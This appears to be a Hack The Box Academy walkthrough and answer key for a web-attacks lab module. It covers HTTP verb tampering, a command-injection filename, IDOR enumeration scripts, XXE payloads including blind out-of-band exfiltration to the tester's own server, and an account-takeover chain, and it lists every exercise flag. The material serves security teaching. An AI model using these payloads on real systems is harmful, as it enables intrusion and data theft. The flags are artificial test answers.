![[cheatsheat-Web Attacks]]

## Section Questions and their Answers

|Section|Question Number|Answer|
|---|---|---|
|Bypassing Basic Authentication|Question 1|HTB{4lw4y5_c0v3r_4ll_v3rb5}|
|Bypassing Security Filters|Question 1|HTB{b3_v3rb_c0n51573n7}|
|Mass IDOR Enumeration|Question 1|HTB{4ll_f1l35_4r3_m1n3}|
|Bypassing Encoded References|Question 1|HTB{h45h1n6_1d5_w0n7_570p_m3}|
|IDOR in Insecure APIs|Question 1|eb4fe264c10eb7a528b047aa983a4829|
|Chaining IDOR Vulnerabilities|Question 1|HTB{1_4m_4n_1d0r_m4573r}|
|Local File Disclosure|Question 1|UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg|
|Advanced File Disclosure|Question 1|HTB{3rr0r5_c4n_l34k_d474}|
|Blind Data Exfiltration|Question 1|HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}|
|Web Attacks - Skills Assessment|Question 1|HTB{m4573r_w3b_4774ck3r}|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Bypassing Basic Authentication

## Question 1

### "Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag."

After spawning the target machine, students need to use `Burp Suite` to intercept the request sent from clicking on the "Reset" button found on the machine's website root page:

![Web_Attacks_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_1.png)

![Web_Attacks_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_2.png)

If students forward the request as is, they will be prompted with a basic authentication prompt:

![Web_Attacks_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_3.png)

Thus, students need to change the request method to `OPTIONS` or `PATH` to bypass the authentication prompt; `OPTIONS` will be used:

![Web_Attacks_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_4.png)

Afterward, students need to forward the edited request:

![Web_Attacks_Walkthrough_Image_5.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_5.png)

When checking the webpage (students might need to refresh it), students will attain the flag `HTB{4lw4y5_c0v3r_4ll_v3rb5}`:

![Web_Attacks_Walkthrough_Image_6.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_6.png)

Answer: `HTB{4lw4y5_c0v3r_4ll_v3rb5}`

# Bypassing Security Filters

## Question 1

### "To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./"

After spawning the target machine, students need to use `Burp Suite` to intercept the request sent from clicking on the "Enter" key, after providing `file; cp /flag.txt ./` as the file name:

![Web_Attacks_Walkthrough_Image_7.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_7.png)

Students then need to right-click and choose "Change request method":

![Web_Attacks_Walkthrough_Image_8.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_8.png)

Subsequently students then need forward the edited request:

![Web_Attacks_Walkthrough_Image_9.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_9.png)

Going back to the website's root page (it's important that "Interception" is turned off, unless students will forward the subsequent requests manually), students will find the file "flag.txt":

![Web_Attacks_Walkthrough_Image_10.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_10.png)

When checking its contents, students will attain the flag `HTB{b3_v3rb_c0n51573n7}`:

![Web_Attacks_Walkthrough_Image_11.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_11.png)

Answer: `HTB{b3_v3rb_c0n51573n7}`

# Mass IDOR Enumeration

## Question 1

### "Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a 'flag.txt' document."

After spawning the target machine and visiting its website's root webpage, students first need to intercept the request that retrieves documents:

![Web_Attacks_Walkthrough_Image_12.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_12.png)

Students will notice that a POST request gets sent to `/documents.php`, along with the `uid` of the employee passed in the `uid` POST parameter; the web server returns the documents of the relevant employee by appending the file names in the `href` attribute within `anchor` tags:

![Web_Attacks_Walkthrough_Image_13.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_13.png)

Therefore, students need to write a script to loop over the first 20 employees' `uid` and capture their document names/links to subsequently download them:

Code: bash

```bash
#!/bin/bash

url="http://$1"

for i in {1..20}; do
	for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[a-z]{3}"); 
	do
		wget -q $url$link
	done
done
```

After saving the script into a file, students need to run it and provide `STMIP:STMPO` as the first command line argument:

Code: shell

```shell
bash script.sh STMIP:STMPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.20]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ bash script.sh 94.237.62.195:53190
```

Once the script finishes executing, students will find the flag `HTB{4ll_f1l35_4r3_m1n3}` in the file `flag_11dfa168ac8eb2958e38425728623c98.txt`:

Code: shell

```shell
cat flag_11dfa168ac8eb2958e38425728623c98.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.20]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat flag_11dfa168ac8eb2958e38425728623c98.txt

HTB{4ll_f1l35_4r3_m1n3}
```

Answer: `HTB{4ll_f1l35_4r3_m1n3}`

# Bypassing Encoded References

## Question 1

### "Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly."

After spawning the target machine and viewing the page source of the `/contracts.php` page, students will notice that the `/download.php` page takes the `contract` parameter with the value being the base64 of `uid`:

![Web_Attacks_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_14.png)

Thus, students need to write a script that will loop over the different employees' `uid` from 1 to 20 and base64 encode them so that they get passed as values for the `contract` parameter and download the corresponding files:

Code: bash

```bash
for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0); do
        curl -sOJ "http://STMIP:STMPO/download.php?contract=$hash"
    done
done
```

After running the script, students will have 20 PDF files downloaded, and to know which one of them contains the flag, students can use `ls` with the `-l` flag to notice that all of them are empty except `contract_98f13708210194c475687be6106a3b84.pdf`:

Code: shell

```shell
ls -lAS contract_*
```

```shell-session
┌─[us-academy-1]─[10.10.14.9]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ls -lAS contract_*

-rw-r--r-- 1 htb-ac413848 htb-ac413848 30 Jul 25 18:04 contract_98f13708210194c475687be6106a3b84.pdf
-rw-r--r-- 1 htb-ac413848 htb-ac413848  0 Jul 25 18:04 contract_1679091c5a880faf6fb5e6087eb1b2dc.pdf
-rw-r--r-- 1 htb-ac413848 htb-ac413848  0 Jul 25 18:04 contract_1f0e3dad99908345f7439f8ffabdffc4.pdf
-rw-r--r-- 1 htb-ac413848 htb-ac413848  0 Jul 25 18:04 contract_45c48cce2e2d7fbdea1afc51c7c6ad26.pdf
-rw-r--r-- 1 htb-ac413848 htb-ac413848  0 Jul 25 18:04 contract_6512bd43d9caa6e02c990b0a82652dca.pdf

<SNIP>
```

Thus, students need to use `cat` on the PDF file to attain the flag `HTB{h45h1n6_1d5_w0n7_570p_m3}` :

Code: shell

```shell
cat contract_98f13708210194c475687be6106a3b84.pdf
```

```shell-session
┌─[us-academy-1]─[10.10.14.9]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat contract_98f13708210194c475687be6106a3b84.pdf

HTB{h45h1n6_1d5_w0n7_570p_m3}
```

Answer: `HTB{h45h1n6_1d5_w0n7_570p_m3}`

# IDOR in Insecure APIs

## Question 1

### "Try to read the details of the user with 'uid=5'. What is their 'uuid' value?"

After spawning the target machine and navigating to its web root page, students need to click on the "Edit Profile" button, forward the first `POST` request, and then send the second `GET` intercepted request to "Repeater" using `Burp Suite`:

![Web_Attacks_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_15.png)

Students will notice that the intercepted request is making a `GET` request to `/profile/api.php/profile/1`; therefore, students need to change "1" to "5" and send the modified request to attain the `uuid` of the user with the `uid` of 5, finding it to be `eb4fe264c10eb7a528b047aa983a4829`:

![Web_Attacks_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_16.png)

Answer: `eb4fe264c10eb7a528b047aa983a4829`

# Chaining IDOR Vulnerabilities

## Question 1

### "Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page."

After spawning the target machine, students first need to attain the `uuid` of an admin account. To do so, students need to enumerate over the `uid` of the employees using the `/profile/api.php/profile/` endpoint using a bash script:

Code: bash

```bash
#!/bin/bash

for uid in {1..10}; do
	curl -s "http://STMIP:STMPO/profile/api.php/profile/$uid"; echo
done
```

Students can use `grep` to filter for word "admin" after piping the results of the script:

Code: shell

```shell
bash script.sh | grep "admin" | jq .
```

```shell-session
┌─[us-academy-1]─[10.10.14.9]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ bash script.sh | grep "admin" | jq .

{
  "uid": "10",
  "uuid": "bfd92386a1b48076792e68b596846499",
  "role": "staff_admin",
  "full_name": "admin",
  "email": "admin@employees.htb",
  "about": "Never gonna give you up, Never gonna let you down"
}
```

Now that the students have attained the `uid` and `uuid` of an admin account, they need to go to the web root page of the spawned target machine, click on the "Edit Profile" button, then click on the "Update profile" button within the "Edit Profile" page while having Burp Suite intercepting requests:

![Web_Attacks_Walkthrough_Image_17.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_17.png)

Subsequently, students need to edit the sent information about the user making it match that of the "admin" account attained earlier, however, the email is changed to `flag@idor.htb` instead and "1" in the endpoint is changed to 10 and at last send the modified intercepted request:

Code: json

```json
{
  "uid": "10",
  "uuid": "bfd92386a1b48076792e68b596846499",
  "role": "staff_admin",
  "full_name": "admin",
  "email": "flag@idor.htb",
  "about": "Never gonna give you up, Never gonna let you down"
}
```

![Web_Attacks_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_18.png)

Afterward, students need to refresh the "Edit Profile" page to find the flag `HTB{1_4m_4n_1d0r_m4573r}` at the bottom of the page:

![Web_Attacks_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_19.png)

Answer: `HTB{1_4m_4n_1d0r_m4573r}`

# Local File Disclosure

## Question 1

### "Try to read the content of the 'connection.php' file, and submit the value of the 'api\_key' as the answer."

After spawning the target machine, students need to run `Burp Suite`, make sure that `FoxyProxy` is set to the preconfigured option "Burp (8080)" in Firefox, and then intercept the form request that contains dummy data:

![Web_Attacks_Walkthrough_Image_20.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_20.png)

![Web_Attacks_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_21.png)

Students then need to use the base64 PHP filter, by adding the below XML data under `<?xml version="1.0" encoding="UTF-8"?>`:

Code: xml

```xml
<!DOCTYPE
email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
```

Because the email is being displayed back, students need to place the "company" entity reference in it as such:

Code: xml

```xml
<email>
	&company;
</email>
```

![Web_Attacks_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_22.png)

Students can send the modified intercepted request to "Repeater" (Ctrl + R) then send the request, and they will receive the base64 encoded PHP file in the response:

![Web_Attacks_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_23.png)

Within the response panel, students need to double click on the base64 string and "Inspector" will decode it; students will find the value of "api_key" to be `UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg`:

![Web_Attacks_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_24.png)

Answer: `UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg`

# Advanced File Disclosure

## Question 1

### "Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error')."

The `CDATA` method will be used first.

After spawning the target machine, students first need to create a `DTD` file on Pwnbox/`PMVPN` utilizing the XML Parameter Entities:

Code: shell

```shell
echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd
```

```shell-session
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd
```

Afterward, students need to start an HTTP server, such as with Python:

Code: shell

```shell
python3 -m http.server PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Subsequently, students need to navigate to `/index.php` and provide dummy data to the required fields. Thereafter, students need to run Burp Suite, make sure that FoxyProxy is set to the preconfigured option "Burp (8080)" in Firefox, and intercept the form request to `/index.php`:

![Web_Attacks_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_25.png)

![Web_Attacks_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_26.png)

Students then need to append the following XML data after `<?xml version="1.0" encoding="UTF-8"?>` and place `&joined;` in the email element:

Code: xml

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://PWNIP:8000/XXE.dtd">
  %xxe;
]>
```

![Web_Attacks_Walkthrough_Image_27.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_27.png)

Before forwarding the modified intercepted request, students need to intercept the response:

![Web_Attacks_Walkthrough_Image_28.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_28.png)

After forwarding the request and intercepting the response, students will find the flag `HTB{3rr0r5_c4n_l34k_d474}` within it:

![Web_Attacks_Walkthrough_Image_29.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_29.png)

To use the error-based method, students first need to write the following error-causing entity lines to a DTD file on Pwnbox/`PMVPN`:

Code: xml

```xml
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

```shell-session
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
EOF
```

Subsequently, students need to navigate to `/error/` and fill dummy data in the form as with the `CDATA` method then intercept the request using `Burp Suite`:

![Web_Attacks_Walkthrough_Image_30.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_30.png)

Students then need to append the following XML data after `<?xml version="1.0" encoding="UTF-8"?>`:

Code: xml

```xml
<!DOCTYPE email [
<!ENTITY % remote SYSTEM "http://PWNIP:PWNPO/XXE.dtd">  
%remote;
%error;
]>
```

After instructing `Burp Suite` to intercept the response to this request and forwarding it, students will attain the flag `HTB{3rr0r5_c4n_l34k_d474}` within it (students also need to make sure that their HTTP server from the CDATA method is still running):

![Web_Attacks_Walkthrough_Image_31.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_31.png)

Answer: `HTB{3rr0r5_c4n_l34k_d474}`

# Blind Data Exfiltration

## Question 1

### "Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag."

After spawning the target machine, students first need to create the OOB DTD file on Pwnbox/`PMVPN`:

Code: shell

```shell
cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://PWNIP:PWNPO/?content=%file;'>">
EOF
```

```shell-session
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.134:8000/?content=%file;'>">
EOF
```

Afterward, students need to start an HTTP server:

Code: shell

```shell
python3 -m http.server PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Afterward, students need to run `Burp Suite`, make sure that FoxyProxy is set to the preconfigured option "Burp (8080)" in Firefox, and intercept the request to `/blind/submitDetails.php` to change its request method from `GET` to `POST`:

![Web_Attacks_Walkthrough_Image_32.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_32.png)

Subsequently, students need to send the below XML data by appending it at the end of the request:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE email [ 
	<!ENTITY % remote SYSTEM "http://PWNIP:8000/XXE.dtd">
	  %remote;
	  %oob;
	]>
	<root>
		&content;
	</root>
```

![Web_Attacks_Walkthrough_Image_33.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_33.png)

After forwarding the request, students will notice that their HTTP server has gotten a request for the "XXE.dtd" file, along with the base64 encoded string of the PHP file:

```shell-session
10.129.138.36 - - [21/Jul/2022 18:57:49] "GET /XXE.dtd HTTP/1.0" 200 -
10.129.138.36 - - [21/Jul/2022 18:57:49] "GET /?content=PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K HTTP/1.0" 200 -
```

Decoding the base64 string yields out the flag `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`:

Code: shell

```shell
echo "PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K" | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo "PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K" | base64 -d

<?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
```

Answer: `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`

# Web Attacks - Skills Assessment

## Question 1

### "Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'."

After spawning the target machine, students need to visit its website's root page and login with the credentials `htb-student:Academy_student!`, making sure to have the Network tab of the Web Developer Tools (`FN` + `F12`) open:

![Web_Attacks_Walkthrough_Image_34.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_34.png)

Inspecting the sent requests, students will notice that there is a GET request to the endpoint `/api.php/user/74` which retrieves the data to populates the user's info:

![Web_Attacks_Walkthrough_Image_35.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_35.png)

![Web_Attacks_Walkthrough_Image_36.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_36.png)

Students need to test if this endpoint is vulnerable to IDOR, by changing the `uid` value to be, for example, 75:

![Web_Attacks_Walkthrough_Image_37.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_37.png)

![Web_Attacks_Walkthrough_Image_38.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_38.png)

Checking the Response tab of the response received from the sent modified request, students will notice that the endpoint is indeed vulnerable to IDOR, as the data of the user with the `uid` 75 is returned back:

![Web_Attacks_Walkthrough_Image_39.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_39.png)

Subsequently, students need to fuzz the `uid` of users from 1 to 100:

Code: bash

```bash
#!/bin/bash

for uid in {1..100}; do
	curl -s "http://STMIP:STMPO/api.php/user/$uid"; echo
done
```

Since students are hunting for privileged users, they need to run the script and use `grep` to search for strings that contain `admin`, finding the user with `uid` 52:

Code: shell

```shell
bash fuzz | grep -i "admin" | jq .
```

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-1s2haz25lu]─[~]
└──╼ [★]$ bash fuzz | grep -i "admin" | jq .
{
  "uid": "52",
  "username": "a.corrales",
  "full_name": "Amor Corrales",
  "company": "Administrator"
}
```

However, the password of the user is still unknown. Analyzing the web application more deeply, students will notice that they can change the password of the current user via the `Settings` page (students need to have the Network tab open still):

![Web_Attacks_Walkthrough_Image_40.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_40.png)

When attempting to change the password, students will notice that the web application sends a GET request to the endpoint `/api/token/74`, and within the response of the request, the `token` of the user is returned, which is `e51a8a14-17ac-11ec-8e67-a3c050fe0c26` for the user with the `uid` of 74:

![Web_Attacks_Walkthrough_Image_41.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_41.png)

![Web_Attacks_Walkthrough_Image_42.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_42.png)

Instead of attaining the token for `uid` 74, students need to modify it to 52, as in `/api.php/token/52`:

![Web_Attacks_Walkthrough_Image_43.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_43.png)

![Web_Attacks_Walkthrough_Image_44.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_44.png)

When checking the response of the sent modified request, students will get `e51a85fa-17ac-11ec-8e51-e78234eb7b0c` as the `token` for the user with `uid` 52:

![Web_Attacks_Walkthrough_Image_45.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_45.png)

Checking the POST request to `reset.php`, students will notice that it requires three parameters, `uid`, `token`, and `password`:

![Web_Attacks_Walkthrough_Image_46.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_46.png)

Instead of reseting the password of the user with `uid` 74, students need to reset the one for `uid` 52, given that all three parameters are known (`uid:52`, `token:e51a85fa-17ac-11ec-8e51-e78234eb7b0c`, and `password` can be set to any arbitrary value, however, it is always a good practice to set it to a strong password to avoid other intruders from accessing the account; students can generate one with the command `openssl rand -hex 16`):

![Web_Attacks_Walkthrough_Image_47.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_47.png)

![Web_Attacks_Walkthrough_Image_48.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_48.png)

However, when checking the response to the request, students will notice that it says in the response "Access Denied", as the backend is most probably checking `PHPSESSID` against the `uid` being sent in the request:

![Web_Attacks_Walkthrough_Image_49.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_49.png)

Students need to bypass this security mechanism by attempting verb tampering, therefore sending a GET request instead of POST, sending the parameters as URL parameters, as in `http://STMIP:STMPO/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=f0e18de14fdadfc38350d97ff7284a25`:

![Web_Attacks_Walkthrough_Image_50.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_50.png)

![Web_Attacks_Walkthrough_Image_51.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_51.png)

After successfully changing the password, students need to sign in as the user `a.corrales` with the password that was used previously (`f0e18de14fdadfc38350d97ff7284a25` in here):

![Web_Attacks_Walkthrough_Image_52.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_52.png)

After successfully signing in as `a.corrales`, students will notice that there is a new feature of "adding events", thus, they need to click on "ADD EVENT":

![Web_Attacks_Walkthrough_Image_53.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_53.png)

With the Network tab of the Web Developer Tools open, students need to feed the fields any dummy data and inspect the POST request sent to `addEvent.php`, discovering that the request payload is `XML` data:

![Web_Attacks_Walkthrough_Image_54.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_54.png)

Students need to instead send a malicious XXE payload that will read the flag file "/flag.php" via the the PHP filter `convert.base64-encode`:

Code: xml

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
    <name>&xxe;</name>
    <details>test</details>
    <date>2021-09-22</date>
</root>
```

![Web_Attacks_Walkthrough_Image_55.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_55.png)

![Web_Attacks_Walkthrough_Image_56.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_56.png)

After sending the request and checking its response, students will attain the base64-encoded string `PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K`:

![Web_Attacks_Walkthrough_Image_57.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_57.png)

At last, students need to decode it to find the flag `HTB{m4573r_w3b_4774ck3r}`:

Code: shell

```shell
echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d
```

```shell-session
┌──(kali㉿kali)-[~]
└─$ echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d

<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

Answer: `HTB{m4573r_w3b_4774ck3r}`